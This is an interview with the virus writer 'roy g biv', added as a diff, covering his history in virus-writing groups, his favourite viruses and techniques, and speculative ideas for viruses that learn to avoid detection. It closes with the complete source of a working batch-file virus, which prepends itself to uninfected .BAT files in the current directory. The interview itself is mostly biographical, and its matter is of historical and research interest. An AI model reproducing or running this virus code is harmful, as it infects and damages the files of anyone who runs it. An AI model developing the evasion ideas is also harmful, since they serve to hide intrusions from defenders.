@@ -1,0 +1,508 @@
+
+             **********************************************
+                        Interview with roy g biv
+                                   by
+                              hh86 and SPTH
+             **********************************************                                  
+                                                                  
+roy g biv has started writing viruses in the 1990s, and is still an active 
+coder of self-replicators. He was member of 29A, has written many virus with 
+novel and unexpected technqiues, many of them featured in security magazines.
+
+You can reach him via iam_rgb@hotmail.com.
+                                  
+The interview was done in two sessions via email in September/October 2013.
+
+Have fun :)
+
+
+
+
+##############################
+## Hey roy g biv, thanks alot for agreeing to this interview! First can you 
+## giveus a description of yourself please. How old are you, where have you 
+## been born/where do you live now? Whats your favorite music? etc...
+
+
+Hello SPTH and hh86.
+I am 34 but I really stopped counting when I reached 30.  I am from a country 
+near the top of Africa, but I have lived in many places.  After some trouble 
+in one of those places, I moved to Iran.  That became a different trouble but 
+there it is.
+
+I don't listen to any music.  I prefer the silence.
+
+
+
+##############################
+## Could you tell us about a usual day of roy g biv? :)
+
+
+There is no usual day for me.  I try to make each day different so that I 
+become not predictable where I go and what I do.
+
+
+
+##############################
+## What's your favorite movie and why do you like it? What has been the worst 
+## movie you've ever seen?
+
+
+I don't watch any movies.
+
+
+
+##############################
+## What is your favorite literature and literature author? In many of your 
+## codes, you have a short quote from "Danny Hillis" about a butterfly - what 
+## is this about?
+
+
+I don't read any books.  All of my information comes from the network, when I 
+can connect to it.  The quote is about the Butterfly Effect, but I like to 
+think of it as my search for a place where I can change something.  Maybe what 
+I write will be used by many people (like TLS technique).
+
+
+
+##############################
+## OK, you dont listen to music, you dont watch movies, you dont read any
+## books. What else are you doing with your 24h/day :)
+
+
+Just surviving, thinking, working.  It's not a simple thing to do here.
+          
+          
+          
+##############################
+## In some forum you have mentioned a robbery in your house - can you tell 
+## something about it?
+
+
+One day, thieves stole everything from my room.  It looked like no-one lived 
+there anymore.  It happens a lot in that area.  They bring a truck and take 
+all of the furniture.
+
+
+
+##############################
+## You wrote in some texts that you wrote your first virus in 1992. Can you
+## please tell us when and where you've heared for the first time about 
+## viruses, why you found them interesting? How you wrote the first one, did 
+## you have some sources or documents of other viruswriters? 
+
+
+In 1992, Computer Virus Developments Quarterly was released, and some CDs of 
+viruses became available.  Before that, BBSes with virus source code were 
+available.  Prototype began with the source code to Diamond to make his Bad 
+Seed virus, and I developed the code further.
+
+
+
+##############################
+## When did you have the first contact to viruswriters, and how did you get 
+## this contact. Of course, today you just type "virus" into google and you 
+## find VX Heaven, but back in that days i guess it was different :) 
+
+
+The contact was using the mail.  We would write letters to each other and send 
+floppy disks.
+
+
+##############################
+## You were sending letters and floppies via old-school post? :-o Never heared
+## that before, I thought those people in early days were paranoid and would
+## defintivly not share the postal addresses?
+
+
+They were boxes at the mail office.  No home addresses there.
+
+
+
+##############################
+## From 1992 to 1995, you have written several codes, many of them under the 
+## group "defjam". Can you tell us a bit about this group, and about the other 
+## two members, Prototype and RT Fishel?
+
+
+The group was just really two people writing PoCs for DOS.
+
+RT Fishel wrote only one thing ever, which was a virus that stored its code in 
+XMS and had a little swap routine in low memory.  Anti-virus memory scanners 
+could not find it because they did not scan the XMS.
+
+Prototype was a good coder for DOS, he had advanced ideas about stealth but he 
+never got the chance to implement them.
+
+
+
+##############################
+## Did you had much contact with the vxers from that time? Did you had contact
+## with Dark Avanger or Dark Angel or those other cool people? 
+
+
+No, I never had any contact with them.  I think that they had retired before I 
+started.
+
+
+
+##############################
+## Between 1995 and 2001, you have been gone. What have you done these days 
+## and what made you come back and start a second carreer of coding awesome 
+## self-replicators? 
+
+
+I had to rest and heal, and in that time the world changed from 16-bit to 32-
+bit.  When I felt better, it was time to challenge myself again.
+
+
+
+##############################
+## You had many many kick-ass viruses in 29a#6, and joined that 29a-team in 
+## 2002/2003. Can you tell us a bit about the time in this legendary group? 
+## Did you had much contact with the other members? Have you planed codes 
+## together or talked alot about ideas and projects?
+
+
+The group had a great reputation for producing new works, but internally it 
+was like a shell with nothing inside.  We would talk sometimes about what 
+people were doing, and review the submissions for the zine, but no-one worked 
+together on anything.
+
+
+
+##############################
+## In 2008, the 29a was officially retired. What happened at the end? What was 
+## the problem and who decided that it goes officially offline? 
+
+
+Everyone left and VirusBuster called the end.  No-one talked to each other, 
+someone was sharing code with outsiders, and there was no trust.  There was a 
+server where we could log in and post message, but suddenly the access was 
+denied and no discussion about it.  I don't want to talk about names.
+
+
+
+##############################
+## You have written so many great codes, can you give us short description of 
+## your favorite ones?
+
+
+Shrug (2001) - this was a direct-action virus that infected PE files (EXE and 
+DLL) without looking at the suffix.  It was the first virus to use the TLS 
+callback method to run the code before the entrypoint.  It automatically 
+selected the correct text-encoding method (ANSI for Windows 9x or Unicode for 
+Windows NT+).  If the relocations were at the end of the file, then the virus 
+would move the relocations down and insert itself into the space.  The virus 
+also added random amounts of garbage to the end of the file to interfere with 
+scanners that look at the end of the file.  It was my first virus for 32-bit 
+Windows.  You never forget your first one.
+
+Junkmail (2002) - this was my second attempt at a super Windows virus.  It was 
+EfishNC with a SMTP engine so it could send mail.  It was the first virus that 
+would send e-mail using polymorphic SMTP headers.  For that, I had the help of 
+RT Fishel who came out of retirement just for that project.  The subject and 
+message body were variable.  The text was all compressed to save space and 
+also to make it hard to know what it could say.  It knew all of the vulnerable 
+IFrame types (MS01-020).  It could send in .BAT, OLE2, or PE formats.  The .
+BAT part was polymorphic, too.  RT Fishel wrote a executable-ASCII base64 
+decoder that used no dictionary!  That was 2002, and I think that still some 
+scanners cannot detect it.  I spent much time implementing every idea that I 
+had while still being fully compliant with the RFC.
+
+Heaven (2011) - this was a direct-action virus that infected PE files (EXE and 
+DLL) without looking at the suffix.  There is nothing special about the 
+infection method because it just changed the entrypoint directly.  The special 
+thing about the code was that it jumped from 32-bit mode to 64-bit mode on 64-
+bit systems.  The power of the 64-bit world in a 32-bit loader.
+
+Polymer (2011) - a truly polymorphic Batch virus.  I knew that it could be 
+done.
+
+
+
+##############################
+## Recently you have been very busy coding many many first-of-its-kind self-
+## replicators for new languages (for my "Language-Infection-Project" :) ). 
+## You hit more than 20 languages (so far) for the first time, just in the 
+## first 9 months of 2013 :-o Tell us what you like about touching new 
+## languages. What was your favorite language that you have infected recently? 
+## What did you learn when you coded self-replicators for so many different 
+## languages? How do you decide which language you want to infect next? What 
+## would be your three favorite victims in future?
+
+
+I like the idea of being first.  The Language Infection Project allows me to 
+do that many times. :)
+
+Algol the best that I have seen so far.  It was a really superior language 
+compared to some languages of today, even it was written in 1968.
+
+My idea was to use a single technique and apply it to all of the languages.  
+It is most interesting to see how differently that technique must be applied 
+in the different languages.
+
+To pick a language to target, I just look at the list and choose the first 
+one.  If I find that I cannot understand it quickly (maybe in one hour), then 
+I move to the next one, and repeat until I succeed.  For languages like Perl 
+and Python and Lua, I studied them for the first time and then infected them 
+all in under one hour.  They are very easy to learn.  For a language like APL, 
+even I understand how it works, still it can take days to write something that 
+works.  I have tried several times to make the virus for Q language, but with 
+no success so far.
+
+I think that the really fun ones would be RPG, ActionScript, and PL/I.  I hope 
+to touch those in the next weeks.
+
+
+
+##############################
+## Which of the code that you have written was the most difficult one? For 
+## which one are you most proud of?
+
+
+In the past years, the Itanium virus was very difficult to write.  When I look 
+at it just now, I don't even understand it anymore.  In this recent time, the 
+APL virus was very hard for me, even it's only 19 lines long.  The difficult 
+things can change over time.
+
+I am not proud of any of the viruses, but of the techniques.  I am happy to 
+see that TLS technique is used by many people, that SEH (soon must be VEH) for 
+common code exit is very useful to make clean code, and 32-bit files can jump 
+into 64-bit world.
+
+
+
+##############################
+## When you have released the first infector for win64 files, there has been 
+## quite some media-echo. What did you think about that? Did you get alot of 
+## comments concerning your code?
+
+
+I was surprised at the reaction but I don't remember any interesting contact 
+from that time.
+
+
+
+##############################
+## For many of your viruses, alot of research on file-formats, operation-
+## system secrets etc. was required. Why do you prefere to release your 
+## findings as a virus-writer rather than a "reverse-engineerer"? Wouldn't 
+## that make your life easier?
+
+
+To describe a technique by itself does not answer the question "how is it 
+useful?", but to make a virus that uses it shows how it can be used, and we 
+all benefit from that.
+
+
+
+##############################
+## You released W32.Relock.B in valhalla#3, an updated version of your 
+## virtual-code technique for Windows 7. Some researchers said this technique 
+## is not possible on Win7. What did they miss and how did you prove them 
+## wrong?
+
+
+They said that the relocation types that I use were not supported anymore.  I 
+proved them wrong by still using those types. :)
+
+
+
+##############################
+## On the evening when valhalla#2 was released, you sent a mail 15mins before 
+## the release. It was a preview-version of your OpenGL version (the full 
+## version was released in valhalla#3 finally). Why did you decide to submit 
+## an unfinished preview version for the first time?
+
+
+:) Because I wanted to be first.  For five years, I wanted to finish that code 
+and at any time, someone might have done it before me.  I did not want that to 
+happen.
+
+
+
+##############################
+## What is your opinion on code optimization? How much time do you spend on 
+## it?
+
+
+I think that the optimisation is good, because it makes the code look 
+"cleaner", but I cannot spend too much time on it because I am not very good 
+at it.  The master of code optimisation was Super/29A.  He was really super.
+
+
+
+##############################
+## What do you think about self-mutations of codes? You wrote some very 
+## complex polymorphic viruses (for instance EfishNC), what have you learned 
+## there? Then there is and metamorphism (only a few viruses can do that). 
+## What do you think about that technique? Could you imagine some other, 
+## mutation techniques?
+
+
+I learned that polymorphism is easy, and I have not achieved metamorphism at
+all so far.  I wonder how much mutation is needed to be called metamorphic?
+For Polymer virus, if I swapped the order of the terms in the "if" blocks 
+would that be enough?  The body is mutated greatly already.  To go beyond the 
+simple changes like that requires so much code and details that I would be 
+silent for a long time and work on nothing else.  I do not know if that can be 
+done. Of course, if I could do that, would be great.  Metamorphism is a so 
+powerful technique that I would be very happy to master it.
+For other mutation techniques, can there be anything else?  A mutation must be
+applied to either the body or its decryptor.  What is left?  Oh, what about a
+virus that mutates its environment so that it can run? :)  Yes, something else
+must run first to achieve that, but it is not necessarily the virus.  I don't
+know how to do that but it seems like an interesting idea.
+
+
+
+##############################
+## What do you think about self-learning codes? How could this be done? What
+## could a code learn, what is an advantage?
+
+
+A virus can learn which machines are protected more than others.  If the virus
+has a way to communicate, and then the communication stops, the receiving code
+might decide that the virus was discovered and so not try to infect that
+machine anymore.  A virus can learn which directories cannot be written, so
+they should be avoided in case someone is watching for attempts to access 
+them.
+A virus can learn about the user activity and might want to scan the network
+during times of high network activity so that it might not be noticed.  A
+virus can learn which files a user accesses most and then make those files
+depend on the virus being present.
+These are just some quick ideas.  I should think more on these.  It is a very
+interesting topic for sure.
+
+
+
+##############################
+## What do you think about codes written for the purpose of stealing money, 
+## for creating botnets etc. Unfortuanatly thats a big buisness for many 
+## years. What is your opinion on that codes technique - for example on 
+## mutation or spreading techniques? Is it high-quality and you find it 
+## interesting, or is it only boring stuff?
+
+
+I hate the idea that people make money from this.  It destroys the scene for
+us since we are all considered to be criminals for this reason.  Even worse is
+that their ideas are all poor or old.  They make encryption routines that a
+child could break and their "stealth" is like elephants running through the
+room.
+
+
+
+##############################
+## Have you ever got a job-offer due to your virus coding-projects? Like 
+## security-companies, anti-virus-companies? secret-service?
+
+
+No, none of those.  I rarely get any e-mail in the first place, and mostly it 
+is spam.
+
+
+
+##############################
+## Do you have contact to people who work in data-security?
+
+
+No, the only people that I contact are you (SPTH and hh86) and now Promix a 
+bit for his E-ZINE.
+
+
+
+##############################
+## Do you know the work of academic researchers such as Eric Filiol and Mark 
+## Stamp, and what do you think about that?
+
+
+I know who they are but I have not read their works.
+
+
+
+##############################
+## What are your most favorite viruses/worms of all time, and why?
+
+
+Hybris is my most favourite virus ever.  The use of plug-ins was really smart.
+
+
+##############################
+## Which techniques that have been developed since mid 80s have been most 
+## influential for virus-writing and creating self-replicators?
+
+
+I don't know of a technique since the mid 80s.  The quine technique that I 
+find to be so powerful for touching new languages - this was done in the 60s.
+
+
+
+##############################
+## Let's come to my favorite topic, the future :) How do you think will self 
+## replicators look like in short-term, like 5 years? in 15 years? And in 
+## long-term - 50years?
+
+
+I wonder if they will be so different to now.  The code is the code, and the 
+OS API does not change much, so we will have our PoCs like always.  The file 
+formats will change but we will still infect them.  Maybe I lack enough 
+imagination to look ahead that far.
+
+
+
+##############################
+## Imagine a nice ghost comes to you and offers you three wishes. What would 
+## it be? :)
+
+
+Better health, longer life, and enough money to go somewhere safe.  I imagine 
+the things that I could code without interruption.
+
+
+
+##############################
+## Thanks alot for your time! Feel free to fill the rest of the document with 
+## whatever you want.
+
+
+I found a compiler for .bat, so... :)
+
+@REM QUINE - ROY G BIV 19/09/13
+@ECHO OFF
+SETLOCAL ENABLEDELAYEDEXPANSION
+SET A=4052454D205155494E45202D20524F592047204249562031392F30392F31330A404543484F204F46460A5345544C4F43414C20454E41424C4544454C41594544455850414E53494F4E0A53455420413D0A53455420423D205222232452522728292A2B2C2D2E2F303132333435363738393A3B523D523F404142434445464748494A4B4C4D4E4F505152535455565758595A5B5C5D525F606162636465666768696A6B6C6D6E6F707172737475767778797A7B527D7E0A464F52202F4C2025254120494E2028302C322C3135313629444F2043414C4C3A45202525410A464F522025254120494E20282A2E42415429444F2049462025257E5A41204C53532036303030302043414C4C3A49202525410A454E444C4F43414C0A404543484F204F4E0A40474F544F3A4B0A3A450A49462025313D3D3136302053455420463D2146212541250A534554202F4120473D307821413A7E25312C32210A534554202F4120483D472D33320A4946202547253D3D313020280A53455420463D2146215E0A0A29454C5345204946202548253D3D31202853455420463D2146215E5E210A29454C5345204946202548253D3D35202853455420463D21462125250A29454C5345204946202548253D3D36202853455420463D2146215E260A29454C5345204946202548253D3D3238202853455420463D2146215E3C0A29454C5345204946202548253D3D3330202853455420463D2146215E3E0A29454C5345204946202548253D3D3632202853455420463D2146215E5E5E5E0A29454C5345204946202548253D3D3932202853455420463D2146215E7C0A29454C53452053455420463D21462121423A7E2548252C31210A474F544F3A454F460A3A490A464F52202F462022544F4B454E533D2A222025254220494E2028253129444F20280A534554204A3D2525420A49462022214A3A7E352C352122204E455120225155494E452220280A52454E20253120520A4543484F202146213E25310A5459504520523E3E25310A44454C20520A290A474F544F3A454F460A290A3A4B0A 
+SET B= R"#$RR'()*+,-./0123456789:;R=R?@ABCDEFGHIJKLMNOPQRSTUVWXYZ[\]R_`abcdefghijklmnopqrstuvwxyz{R}~
+FOR /L %%A IN (0,2,1516)DO CALL:E %%A
+FOR %%A IN (*.BAT)DO IF %%~ZA LSS 60000 CALL:I %%A
+ENDLOCAL
+@ECHO ON
+@GOTO:K
+:E
+IF %1==160 SET F=!F!%A%
+SET /A G=0x!A:~%1,2!
+SET /A H=G-32
+IF %G%==10 (
+SET F=!F!^
+
+)ELSE IF %H%==1 (SET F=!F!^^!
+)ELSE IF %H%==5 (SET F=!F!%%
+)ELSE IF %H%==6 (SET F=!F!^&
+)ELSE IF %H%==28 (SET F=!F!^<
+)ELSE IF %H%==30 (SET F=!F!^>
+)ELSE IF %H%==62 (SET F=!F!^^^^
+)ELSE IF %H%==92 (SET F=!F!^|
+)ELSE SET F=!F!!B:~%H%,1!
+GOTO:EOF
+:I
+FOR /F "TOKENS=*" %%B IN (%1)DO (
+SET J=%%B
+IF "!J:~5,5!" NEQ "QUINE" (
+REN %1 R
+ECHO !F!>%1
+TYPE R>>%1
+DEL R
+)
+GOTO:EOF
+)
+:K
